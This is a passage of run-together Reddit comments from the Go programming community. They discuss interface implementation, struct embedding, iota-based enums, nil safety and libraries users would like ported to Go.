class, so you could pass them into .Save via interfaces. 
Not a standard library but I haven't seen anything like psutil in Python. I couldn't find anything as powerful in Ruby or Go. I was just looking into this recently.
Not a library but I would really really really like to see logstash ported to Go - it's the perfect language for it.
You don't need to embed Job in DummyJob. You just need to define UndoIt() so it satisfies the Job interface. http://play.golang.org/p/DDygS9xSsU The cool thing is DummyJob can belong to a totally different package. It doesn't even have to know that a Job interface exists. The package that defines JobJobJob() can still use the Job interface to accept the DummyJob object. I blogged about struct embedding when I was really new to Go: http://techno-weenie.net/2013/8/29/embedding-structs-in-go/. Effective Go (https://golang.org/doc/effective_go.html) is a better resource too.
Embedding `Job` in the struct is not necessary to implement the interface. The interface will be satisfied implicitly if you create a `UndoIt()` method. By embedding `Job` and then initializing an empty `DummyJob` you have a nil pointer, because interfaces are pointers. So you do have compile-time interface safety, but nil pointers are another story.
iconv would be useful. 
ffmpeg for sure! So many gains to me made with goroutines here. Is there any video processing library for go at all?
&gt; I'd like to see a GUI package as well but seeing the pain that andlabs goes through with his UI package, I don't know... Don't you think that it would be maybe better to create (thick) bindings to wxWidgets instead? 
I haven't had a problem finding "Go" resources by searching for "golang". Pretty much everyone who uses Go has had the same thought you just had, and we've all reached a silent consensus to just use "golang" when searching or writing.
I like/miss Python's NumPy, SciPy, MatPlotlib, IPython( notebook)...
I noticed this while browsing github earlier: https://github.com/shirou/gopsutil
It would be nice to have a library to integrate applications in a corporate environment: * Decent LDAP client * Informix sql driver (anything based on ODBC should be abolished) * Microsoft interop Might not all be open source, but would be awesome nevertheless. 
I think you didn't get it. Simple enumeration is simple: const ( Some = iota Random Stuff ) But Go's approach also makes more complex stuff like bitmasks simple and enumerable: const ( Never = 1 &lt;&lt; iota Gonna Give You Up )
I hope they'll make nil pointers compile-time save in Go 2.
Not sure if complaining about reposts is accepted in /r/golang, but this article was posted just [ten days ago](http://www.reddit.com/r/golang/comments/2e0b7b/go_is_fun_familiar_and_fast/). And IMO, those "Go is great!" articles are getting old. Yes, Go is great, we know it. Now show us how we can make even greater stuff with it, and make it better, faster, and more elegantly. Show us new ways of using it. Show us some internals and what we need to learn from it. [OP's articles](http://dave.cheney.net/category/golang) are the kind of thing I am talking about.
I completely agree; and, it's never bad to complain about reposts that *just* left the page.
Yeah, I love when people posting library, or some clever ways to do things. Prasing gets old pretty fast
I'd rather they totally replace nil with an [opotion type]( https://en.wikipedia.org/wiki/Option_type). I hate that all pointers are inherently nullable. I'd like to be able to indicate in my code which functions should be allowed to return null and which should not.
Best practices: https://golang.org/doc/effective_go.html
Google around for dependency injection. There are several articles out there, and this design pattern should be #1 in your list of learning and becoming proficient in. I really like the encoding/base64 package as an example of a very usable and simple package to model after. I really like the use of the DefaultEncoder variables, and the supporting code. It is all defaulted to usable settings, and can be easily customized for anyone's needs.
Fixed, thanks for the heads up. 
Mutagen! However that project is so huge that I don't see it getting done anytime soon.
So what if this is a repost ? Reddit is not search engine ! 
Now I understand your opinion, but I don't agree. Imho, const ( Some = iota Random Stuff ) and enum ( Some Random Stuff ) looks similar to me in terms of readability. And the documentation is pretty compact: Within a constant declaration, ´iota´ is an untyped integer constant. It's reset to 0 whenever ´const´ appears and increments after each line break.